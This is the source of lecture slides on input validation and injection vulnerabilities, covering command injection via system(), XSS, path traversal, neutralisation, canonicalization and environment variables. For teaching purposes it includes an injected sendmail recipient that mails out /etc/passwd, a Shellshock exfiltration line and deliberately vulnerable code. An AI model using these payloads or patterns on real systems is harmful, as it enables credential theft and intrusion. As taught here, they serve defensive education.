# Terminology and techniques

### Injection

"Injection"-type vulnerabilities are ranked amongst the CWE's
most dangerous vulnerabilities.

The CWE describes CWE-74 "Injection" as follows:

&nbsp;

> "The software constructs all or part of a command, data structure, or
> record using externally-influenced input from an upstream component,
> but it does not neutralize or incorrectly neutralizes special elements
> that could modify how it is parsed or interpreted when it is sent to a
> downstream component."

### Injection

- "Upstream" and "downstream" refer to the *flow of data* between
  components
- "Components" could be functions, methods, objects, programs, or entire
  systems -- it depends on what you're looking at
  - Example: flow of data through a web-based forum system

```{=latex}
\begin{center}
```

![](lect05-images/injection-forum.svg){ width=60% }

```{=latex}
\end{center}
```

::: notes

Traditionally, data flow was shown using "dataflow diagrams", but any
"box and arrow" diagram where the meaning is clear will do

### Input-validation vulnerabilities

\small

Injection vulnerabilities arise because we've failed to validate and/or
sanitize input properly.

In all of them, an attacker is able to use specially crafted inputs to
subvert our security goals.

Some vulnerabilities of this sort are common enough to have their own names.

OS command injection ([CWE-78][cwe-78])

:   \
    External input is used when invoking some external command, and
    allows an attacker to run commands we don't intend

SQL injection ([CWE-89][cwe-89])

:   \
    External input is used when constructing an SQL database query, allowing an attacker
    to run queries we don't expect (altering the database or returning confidential data)

[cwe-78]: https://cwe.mitre.org/data/definitions/78.html
[cwe-89]: https://cwe.mitre.org/data/definitions/89.html

### Input-validation vulnerabilities

Cross-site scripting ("XSS", [CWE-79][cwe-79])

:   \
    External input is used when constructing content to be displayed by
    a web site, and allows an attacker to run malicious code.

Path traversal ([CWE-22][cwe-22])

:   \
    External input is used to construct a path which *should* be
    restricted to a particular directory -- but due to improper
    validation, an attacker can gain access to other directories


[cwe-79]: https://cwe.mitre.org/data/definitions/79.html
[cwe-22]: https://cwe.mitre.org/data/definitions/22.html

::: notes

In the CWE hierarchy, "path traversal" doesn't actually sit under
CWE-74, "injection" --  it's a sibling class of vulnerabilities to "injection".

But it is, basically, the same sort of problem:

- We're using a component (the filesystem) in which certain elements have
  special meanings (e.g. "`..`")
- External input has been used when constructing data to be passed to
  that component
- We've failed to properly validate that input
- As a result, an attacker is able to influence or control what gets
  passed to the component, and can use it to compromise our security
  goals (in this case, get access to directories they shouldn't)

:::::::::::::: {.columns}

::: {.column width="60%"}

\vspace{0.5em}

\small

- Injection problems arise because particular characters can have
  \alert{special meanings} for downstream components.

- For instance, web servers send [HTML](https://en.wikipedia.org/wiki/HTML) to browsers.

\vspace{2em}

:::
::: {.column width="40%"}

&nbsp;

:::
::::::::::::::

\small

- If posters on a forum are allowed to create any HTML they want, they can
  emit the sequence "`<script> ... </script>`"

- The poster can include arbitrary JavaScript between the "`script`" tags, and
  when the post is read by some user, that JavaScript will be executed
  by the user's browser

- (Browsers contain safety features which attempt to limit the harm
  that can be done by a web page -- but allowing a poster to execute
  arbitrary JavaScript is still a very bad idea.)

### Solution

- Limit what "special" HTML sequences users are allowed to include in their posts
- *Neutralize* (render harmless) or remove (filter) everything else

&nbsp;

- This needs to be part of a coherent approach to managing
  \alert{untrusted inputs} and ensuring they can cause no harm

### Solution

We consider this further when we look at secure software development
processes.

As part of a secure design, we need to

- identify sources of input
- identify flows of data
- identify languages and formats used, and their special elements
- neutralize special elements before they are either relied upon
  by some component, or included in output

### Causes of most input vulnerabilities[^most-problems]

Unintended parsing

:   \
    Data treated as special when it shouldn't be

Overlooked input channels

:   \
    Failing to notice ways untrusted data can be inserted

Overlooked data flows

:   \
    Failing to notice some circuitous route untrusted data can take

Unexpected expressivity

:   \
    A language or format being used is more expressive than intended


[^most-problems]: Poll, [*Secure Input Handling*][poll-url] (version 1.0, Nov 2023)


### Terminology -- neutralization

\small

No universally accepted terminology, but usually:

\alert{Escaping}

:   Replacing some sequence of characters with an "escaped" or "quoted"
    equivalent, so that it loses its special meaning.

::: block

\small

#### Example: HTML

`<b> ... </b>` means "make the enclosed text
bold". So what if we want to actually show the reader the *literal*
characters "`<b>`"?

We escape the `'<'` and `'>'` so they lose their special meaning --
we write

```html
    &lt;b&gt; ... &lt;/b&gt;
```

:::

\small

We're *often* talking about text, so I'll use the word
"characters"; but we could be talking about something more general
(bytes, sequences of numbers, data structures) -- hence the CWE uses
"elements".

::: notes

defns influenced by <https://security.stackexchange.com/questions/143923/whats-the-difference-between-escaping-filtering-validating-and-sanitizing/143925#143925>,
but that answer just reflects general standard usage.

:::


### Escaping

::: block

#### Example: C

In C, we can represent a character literal by putting it in single quotes.

To represent the single quote character itself, we use the backslash
("`\`") to escape it.


```c
    char c = '\'';
```

:::

### Neutralization -- filtering

\alert{Filtering}

:   Stripping out some sequence of characters entirely.
    In some contexts might be called "whitelisting" or "blacklisting",
    depending how implemented.

::: block

#### Example: HTML

We could *filter* HTML "special characters" from some source by
stripping them out entirely.

(`'<'` and `'>'` are two examples, but there are more.)

:::


### Neutralization -- validating

\alert{Validating}

:   Comparing a sequence of characters (or other input) against
    a pattern or rule which determines what input is allowable.

::: block

#### Example: Year

Given a 4-character sequence, we can write a function to determine
whether it represents a valid *year* in the second or third millenium.

```plain
Pseudocode:

- The first character must be the digit '1' or the digit '2'
- The remaining characters must be digits
```

:::

Often, [regexes][regex] are used to check whether some sequence of
characters is valid.

[regex]: https://en.wikipedia.org/wiki/Regular_expression

### Parse, don't validate[^king]

<!--

example: 

- bad passwords, vs good passwords
- or: valid license IDs vs invalid license IDs

-->

- Booleans give you a "yes/no" to the question "Is input X valid?"
- Better is to \alert{parse} the input into some struct or object
  so that it can't be confused with other strings, ints, etc

[^king]: For further reading: see Alexis King, ["Parse, don't
  validate"][king-url] (2019)

[king-url]: https://lexi-lambda.github.io/blog/2019/11/05/parse-don-t-validate

### Example

Suppose we have some string that should represent a URL.

**Validation**

:   Write a boolean validation function in your preferred
    language (e.g.  `bool isValidURL(const char *)` in C) that
    checks whether the string is really a URL.

**Parsing**

:   *Parse* the input string, and if it represents a URL,
    return a new type with the invariant "Represents a valid URL".

<!--

e.g. parsing in Java: `URL parseURL(String s) throws InvalidURLException`

In C, we'd likely need to create our own `struct URL` type. (Query:
what would the signature for our function be? How would we indicate
failure?)


### Advantages

*Validating* leaves the input as a string; but a string is (almost)
bare, unstructured data -- tells us nothing about what the string
*represents*.

*Parsing*

- Helps ensure we only parse *once* -- we can't confuse a parsed `URL`
  for a string
- Ensures we don't pass un-parsed data to functions -- our URL-handling
  functions will only take a `URL`, not a string

::: notes

Not *quite* bare. C strings have one character with special meaning,
namely the null character.

This means they can't represent sequences that contain nulls.

- Failing to handle embedded nulls is its own vulnerability type,
  see CWE 158, <https://cwe.mitre.org/data/definitions/158.html>
  "Improper Neutralization of Null Byte or NUL Character"

Example exploit:

See Poll, [*Secure Input Handling*][poll-url] (version 1.0, Nov 2023).

Browsers including Firefox improperly handled null characters in domain
names of X.509 certificates -- `www.paypal.com\0.mafia.com` was regarded
as a valid cert for PayPal, even though correctly issued to `mafia.com`

:::

### Disadvantages

Main disadvantage of parsing is extra code.

Some languages make it easier than others to create new types.

::: notes

C does not make creation of new types very ergonomic; Java does a little
better; languages like Python, C#, Rust, Haskell and ML do better still.

:::

If your code passes around data as strings -- especially when better types are
available (often the case in Python, Java) -- it is often said to be
["stringly typed"][stringly], a code smell.

[stringly]: https://www.hanselman.com/blog/stringly-typed-vs-strongly-typed

-->

### Neutralization -- sanitizing

\alert{Sanitizing}

:   Sometimes used to mean "filtering".

    Sometimes used to mean some combination of escaping, filtering, and validation that ensures
    some input does not trigger undesired behaviour. Equivalent to
    the general term \alert{neutralization}.



### Canonicalization

- In addition to neutralization -- another relevant technique. \
  Also called \alert{normalization}.

- Example: paths.

  `/etc/passwd` and `/etc/../etc/passwd` represent the same path.


::: notes

in maths, canonicalization and normalization are different ...
"canonical" implies unique, "normal" need not.

see e.g. <https://en.wikipedia.org/wiki/Canonical_form>

:::

### Canonicalization -- why?

If you have data (like a path) where there can be multiple
representation of the same "thing", it becomes impossible to know
whether two things are actually the same thing.

Solution: canonicalize them.

On Unix-like systems, canonicalizing *paths* typically means making them
absolute, instead of relative, and removing any "`/..`" and "`/.`"
sequences.

Before taking any security decision based on some input, it should be
put into canonical form (if relevant).


### Canonicalization -- why?

Canonicalization can help deal with *unintended expressivity*.

File paths *look* like they're "just" strings -- but they are their own
"language", with its own metacharacters with special meanings


::: block

#### Unexpected expressivity

Some language or format being used is more expressive or complex
than a designer or developer realized, and can be used to express
things they didn't intend.

:::

Another example -- [homograph
attacks](https://en.wikipedia.org/wiki/IDN_homograph_attack) (similar to
"typosquatting", but not the same)

### Identifying sources of input

Suppose we're writing a command-line program in C.

Question: What are possible sources of *input* to the program?

::: notes

some examples:

- files read
- command-line arguments passed
- environment variables -- e.g. `PATH`, `LD_LIBRARY_PATH`
- input supplied by a user at the terminal
- input from other peripherals: mouse, touch-screen, other pointing
  device
- input read from over the network

:::

### Managing input

Check your assumptions about what sources are "trusted".

Example: "Information taken from the database is assumed to be
trustworthy".

\pause

That's only the case if you checked it for trustworthiness on the way
*into* the database.

::: block

#### Overlooked data flows

A designer or developer fails to notice a route by which malicious
input can end up affecting or being processed by an application.

Example: "second-order injection" attacks. Untrusted data is inserted
into a database, but no harm is caused until its retrieved from the
database, incorrectly treated as trustworthy, and used by a downstream
component.

:::

::: notes

See Erik Poll, "2.7 What goes wrong: overlooking data flows".

Second order injection attacks -- e.g. an attacker controls data that is
stored in a database. The *storing* causes no issues; but after being
retrieved, the data is interpreted in a way to cause an injection attack
(e.g. is published as HTML).

:::


### Dealing with input

Question: "Do we need it?"

- If not: filter or remove what you don't need

- e.g. If your program doesn't make use of environment variables, you
  may as well strip out all the ones you don't need

### Dealing with input

Assuming you do need the input:

- Be wary of strings
  - especially when passed to a downstream component
  - especially if that downstream component implements or makes use of
    some
    *language* (i.e. there are characters/elements with special meaning)

Examples of downstream components which use or implement a language:

- the `system()` function (interprets shell scripts and commands)
- SQL database systems (interprets SQL queries)

### Example: the `system` library function

`\begin{center}`{=latex}

[`int system(const char *command)`][system-func]

`\end{center}`{=latex}

- Invokes the host environment's *command processor* with the parameter
  `command`
  - On Unix-like systems, `bin/sh` is typically invoked
  - On Windows, `cmd.exe` is typically invoked
- The command processor interprets `command` according to the rules for
  its language
- That language will have particular special characters -- e.g. "`;`" to
  separate commands.

[system-func]: https://en.cppreference.com/w/c/program/system

### `system` -- injection example

From CWE-77 "Command Injection":

::: code

####

```
int main(int argc, char** argv) {
  char cmd[CMD_MAX] = "/usr/bin/cat ";
  strcat(cmd, argv[1]);
  system(cmd);
}
```

:::

Here, the developer's intent is that the user supply a filename as the
first argument to the command (`argv[1]`).


### `system` -- injection example

::: code

####

\small

```
int main(int argc, char** argv) {
  char cmd[CMD_MAX] = "/usr/bin/cat ";
  strcat(cmd, argv[1]);
  system(cmd);
}
```

:::

The `system` function is then used to execute `"/usr/bin/cat/"` +
`argv[1]`.

What can go wrong here?

### Unintended parsing

This is an example of *unintended parsing* -- the shell interprets
what input is given to it, and we let that input contain sequences with
special meanings

::: block

#### Unintended parsing

Something is treated as special (e.g. as HTML, as SQL, as part of a
Bash command sequence) when it shouldn't have been

:::

### Unintended parsing

The German art collective !Mediengruppe Bitnik published a book entitled
"`<script>alert("!Mediengruppe Bitnik");</script>`"

Many online bookshops discovered they weren't properly sanitizing book
*titles* before publishing details on the web.

An example of both *unintended parsing* (titles should contain no, or
only limited, special characters) and *overlooking input channels*
(book details not noticed as a source of input).

::: block

#### Overlooked input channels

A designer or developer overlooks a way in which malicious input can
end up affecting or being processed by an application

(Example: environment variables, local files)

:::

::: notes

source:

- Erik Poll, [*Secure Input Handling*][poll-url] (version 1.0, Nov 2023)

Bitnik exploit happened in Berlin in 2016.

:::

### Dealing with input

- Keep track of what *source* input came from, and to what degree
  it is trustworthy
- Try to use more appropriate types than strings
- Parse from string to type
- Or if not parsing, at least validate

::: notes

appropriate types: C does not make this easy.

*Strings* are in fact the standard way of passing data to, e.g. shells,
database systems.

:::

### Dealing with input

- Keep track of what languages are used by downstream components.

- If possible, use appropriate types to represent them, so you don't get
  confused.

- *Before* passing data to a component, ensure any portions that came from
  untrusted input are escaped or quoted.

- Details of how to correctly escape or quote are often complex
  - If possible - rather than writing your own escaping/quoting
    routines, use a well-tested library.

### Downstream component

A "downstream component" could be

- a call to a library function. \
  For example, to
  - display a picture
  - play an animation
  - execute an OS command
- a message sent to another service. \
  For example, to
  - send a web request to some server
  - query a database

<!--

### Injection

We can imagine the situation looking something like this:

`\begin{center}`{=latex}
![](lect05-images/injection.svg)
`\end{center}`{=latex}

-->

### Downstream component

"query a database":

- It's easy to think of this as meaning "get some information from a
  database"
  - when it really means "perform operations on a database
    (which could be reads or modifications)"

"compile some files":

- It's easy to think of this as meaning "read from some files, and
  create an output program"
  - When actually, most compilers are set up so that they can
    perform nearly arbitrary actions during "compilation"


### Invoking downstream components

When invoking/passing data to downstream components -- select the
safest alternative for doing so.

C

:   `system`, `exec` family vs safe wrapper libraries

Python

:   `os.system` vs `subprocess` module

SQL

:   Hand-constructed queries vs [prepared statements](https://en.wikipedia.org/wiki/Prepared_statement)

# Command injection

### Why programmers use `system`

It's very common for programmers to insert `system` calls
(or the equivalent) in application code.

(i.e. to "shell out" a command -- have the command
be interpreted by a command shell.)

Reasons for this:

- Lack of an equivalent library in the language
- Convenience, time saving
  - Shell is easier to use than library


### C -- high-level shell-spawning

C only provides one portable way of executing other programs --
the [`system` function][c-sys-func] (which you should avoid using).

[c-sys-func]: https://linux.die.net/man/3/system


```C
  int system(const char *command);
```

Unix systems will usually provide the [`popen` function][c-popen],
which is similar (and also best avoided) but gives you
a "pipe" through which you can send input to a newly
spawned process (**or** receive output from it; but you
have to choose one or the other)

```C
  FILE *popen(const char *command, const char *type);
```

[c-popen]:  https://linux.die.net/man/3/popen

These are both fairly "high-level" functions (in C terms).

### C -- low-level process building blocks

Since `system` and `popen` aren't considered safe, what do we use?

Preferred

:   use libraries of safe versions (e.g. the "O'Reilly Secure Programming Cookbook"
    functions, discussed later)

Less preferred

:   build up your own OS-specific
    solutions from simpler "building blocks".

On Unix systems, the low-level "building blocks" are:

- the "`exec`" family of functions (see `man execv`)
- the `fork()` function (see `man fork`; on Linux, this is a wrapper around
  the more powerful `clone()` system call)
- the `glob()` function (see `man glob`), or lower-level functions like
  `readdir()`

::: notes

`clone()` and `clone3()` give you more precise control
than `fork()` over exactly what is copied or shared between parent and child.

You can specify

- what function the child process should start off in,
- through a bunch of flags, things like whether the new process
  has new *namespaces*, and DIY your own container/Docker-like system


:::

### C -- low-level process building blocks

The "`exec*`" family of functions

:   e.g. `int execv(const char *path, char *const argv[])`; these
    replace the currently executing program with another.

`fork()`

:   This lets you "clone" a near-copy of the current process.

`glob()`

:   Find files which match a pattern

### Building a solution

- Many ways to accidentally create security
  vulnerabilities with the `exec*` functions and `fork()`
- Unless experienced with them, you're usually best reading
  and adapting a well-vetted recipe from someone else.
- A good source is the
  `\textit{Secure Programming Cookbook for C and C\texttt{++}}`{=latex}
  by John Viega and Matt Messier (O'Reilly, 2003)\
  \vspace{0.5em}
- Mostly available on the web via the O'Reilly website,
  <https://www.oreilly.com>
- Provides sample code
  - e.g. `spc_popen`, a safer version of `popen()`.
  - e.g. `spc_fork`, a safer wrapper around `fork()`.


### Why is `system` unsafe?

Two main reasons:

- It invokes the system system shell, itself a complex piece
  of software
- It delegates to the system shell the job of

  - parsing the command(s) being executed -- which could
    be an arbitrarily complex sequence of shell operations
    and wildcards
  - finding (somewhere on the user's `PATH`) any executables
    to be invoked

Both of these introduce lots of opportunities for things to go
wrong, and especially, for injection attacks

::: block

####

\vspace{-1em}
```C
char cmd[CMD_MAX] = "/usr/bin/cat ";
strcat(cmd, argv[1]);
system(cmd);
```

:::


### Why are `exec*` functions safer?


::: block

####

\small

```C
char cmd[] = "/usr/bin/cat";
char* cmd_args[] = { "cat", argv[0], NULL };
char* env[] = { NULL };
int res = execve(cmd, cmd_args, env); // plus, probably, a fork()
```

:::

- You have to specify the full path to the command being executed
  -  (Though the functions with `p` in the name -- `execlp`, `execvp`,
     `execvpe` -- will do a search in the `PATH` if you're sure it's
     safe)
- You can invoke only one command, and have to break up the arguments
  yourself; there's no opportunity to "inject a semicolon"
  - (Though it's always possible to invoke `/usr/bin/sh` if you want to)

### Why are `exec*` functions safer?


::: block

####

\small

```C
char cmd[] = "/usr/bin/cat";
char* cmd_args[] = { "cat", argv[0], NULL };
char* env[] = { NULL };
int res = execve(cmd, cmd_args, env); // plus, probably, a fork()
```

:::


- You have precise control over the environment variables the
  executed command can see, and can sanitize them
  - (Though the functions without an `e` at the end will just copy
    over the parent environment, if you're sure that's what you want)

### `system` precautions

If you *have* to use `system()` ...

- Sanitize the environment
  - Always better to keep only environment variables you *want* to
    allow, rather than try to remove ones you think could be dangerous
    (that is -- whitelist, don't blacklist)
- Ideally, pass only a fixed string argument, with no wildcard
  characters
- Avoid including in the string argument any data which has come from
  the user (e.g. via `argv`)
  - And if you must, better to whitelist "known safe" characters or
    substrings, than try to detect unsafe ones

### `exec*` precautions

- You should close all file descriptors you don't wish to deliberately
  pass to the child
- As for `system`, you should sanitize the environment (perhaps just passing an empty
  environment)
- Ensure you've permanently dropped any privileges before calling an `exec*`
  function, else the new program will inherit them


### Running commands from other languages {.fragile}

```{=latex}
Most other languages (Python, Java, and others) provide
a wrapper around or similar functionality to
\passthrough{\lstinline!system()!}:\\1em

\begin{center}
\begin{tabular}{p{3cm}p{3cm}p{3cm}}
%\begin{tabular}[c]{@{}l@{}}aaa\\ LL\\ \\ mm\end{tabular} & \begin{tabular}[c]{@{}l@{}}xxx\\ \\ pp\end{tabular} \\
  Language: & Python & Java \\[0.5em]
  Method:   & \texttt{os.system} & \texttt{Runtime.exec(String cmd)} \\
\begin{minipage}{2.8cm}

Sample code:

\begin{lstlisting}[language=Java]
Runtime.getRuntime()
       .exec("ls *");
\end{lstlisting}
\end{tabular}
\end{center}
```

### Running commands from other languages {.fragile}

Most languages also provide a somewhat "safer"
command-running method, more like the `exec*` functions.

Python:

- Classes and functions in the `subprocess` module allow
  tight control over exactly what is executed and how commands
  are passed

Java:

- `Runtime.exec(String[] cmdarray)` is similar to
  C's `execve`
- As opposed to `Runtime.exec(String command)` (the unsafe one)
- Other versions of `Runtime.exec()` expose additional
  functionality.

### Example commands in code

Another example
(taken from *Building Secure Software*, p.320).

A Python CGI script processes a submitted web form,
and extracts whatever an end user put in the "mail recipient" field:

::: code

####

\footnotesize


```python
# ... construct a message in /tmp/cgi-mail
os.system("/usr/bin/sendmail" + recipient + "< /tmp/cgi-mail")
```

:::

### Example commands in code

::: code

####

\footnotesize

```python
# ... construct a message in /tmp/cgi-mail
os.system("/usr/bin/sendmail" + recipient + "< /tmp/cgi-mail")
```

:::

The developer *assumes* recipient is
an email address -- e.g. `bob@bigcompany.com`

\pause

But it could be:

`attacker@hotmail.com < /etc/passwd;`

# Metadata

### Metadata

\alert{Metadata} accompanies some body of data and provides
additional information about it.

For example:

- how to display text strings by representing
  end-of-line characters
- indicating where a string ends, with an end-of-string marker
- mark-up such as HTML directives

For communications such as phone calls and
email messages, metadata means all the data other than
the message content (e.g. for emails, "To:", "From:", "Subject:", date,
etc)


### Meta-characters

Meta-\alert{characters} are single characters with a special meaning.

So common in some formats
that it's easy to forget they are there.

For example:

- \alert{separators} or \alert{delimiters} used to encode multiple
  items in one string
- \alert{escape sequences} which describe additional data. e.g.
  - newline character (`'\n'`), tab character
    (`'\t'`)
  - Unicode characters (`"\u0bf2"` in Python, "Tamil number one
    thousand")
  - Binary sequences (`"\x48\x31"`)

Metacharacters often indicate some special encoding/meaning to be
used when intepreting other characters.

### Common meta-characters

Examples of meta-characters:

- Filenames (e.g. `/var/log/messages`, `../etc/passwd`)
  - the directory separator `/`
  - parent sequence `..`
- Windows file or registry paths (separator `\`)
- Unix PATH variables (separator `:`)
- Email addresses (use `@` to delimit the domain name)

(What are some others?)

### Meta-characters for Unix shells

Some examples

- `#` -- Indicates a comment
- `;` -- terminates command
- `\textcolor{verdant}{\fontfamily{fvm}\textasciigrave}`{=latex} -- backtick --
  inserts output of a command

There are lots of other metacharacters, e.g.

```
^  $  ? %  &  (  )  >  <  [  ]  *  !  ~  |
```

### SQL metacharacters

In SQL, the semicolon is a metacharacter which marks the end
of a command.

`\begin{center}`{=latex}

`\end{center}`{=latex}

# Sources of data -- environment variables

### Environment variables

- \alert{Environment variables} are an (often neglected) form of input
- An attacker may be able to change them.

They're not the same as *shell variables*.

Some especially significant environment variables:

- `PATH` -- a search path for finding programs
- `LD_LIBRARY_PATH`  -- tells dynamic link loaders where to look for shared libraries
- `HOME` -- location of user's home directory

### Source of environment variables

How does a process get its environment variables?

In one of two ways:

- If a new process is created using the `fork()` system call, the child process will
  inherits its parent process's environment variables.

`{ \footnotesize`{=latex}
`execve(const char *pathname, char *const argv[], char *const envp[])`
`}`{=latex}

- `execve()` doesn't copy variables over, just creates
  the ones in `envp`
  - You can also manually copy some from the existing `environ`

### Problems with `PATH`

- `PATH` defines a search
  path to find programs
- If commands are called without explicit paths, an
  incorrect (e.g. malicious) version may be found

One default on old Unix systems was to
put the current working directory first on the PATH:

```
PATH=.:/bin:/usr/bin:/usr/local/bin
```

Why might this be a problem?

### Pre-loading attacks on Unix

Unix systems use a search path for dynamic libraries which can be
defined/overridden by variables such as:

- `LD_LIBRARY_PATH`
- `LD_PRELOAD`

If an attacker can influence these paths, they can
change the libraries which get loaded.

Modern libraries avoid using these variables for
`setuid` programs.

### Erasing environment variables

In C/C++:

A simple way to erase all environment variables is setting the global
variable `environ` to `NULL`.

`environ` has the declaration:

::: code

####

```C
extern char **environ;
```

:::

(See `man 7 environ`.)

Though note, the documentation of `environ` doesn't explicitly say you *can*
write to the variable this way.

<!--

### Shellshock

Bash (as with other programs) has environment variables.

Some of those can hold one-line *functions*:

`sayhi() { echo "hi"; }`

Bash's only way of "importing" a function is to run the function
definition.

### Shellshock

In vulnerable versions of `bash`, one could append arbitrary
commands at the *end* of such a function definition.

`sayhi() { echo "hi"; }; sendmail me@me.com </etc/passwd`

A major problem, since
many web servers at the time
allowed web requests to be handled by scripts,
and passed attacker-controllable information about a web request in
environment variables.

### Shellshock

The fix: environment variables holding *function* definitions
are now marked with a special prefix and suffix, so that normal
variables
can't be treated as functions.
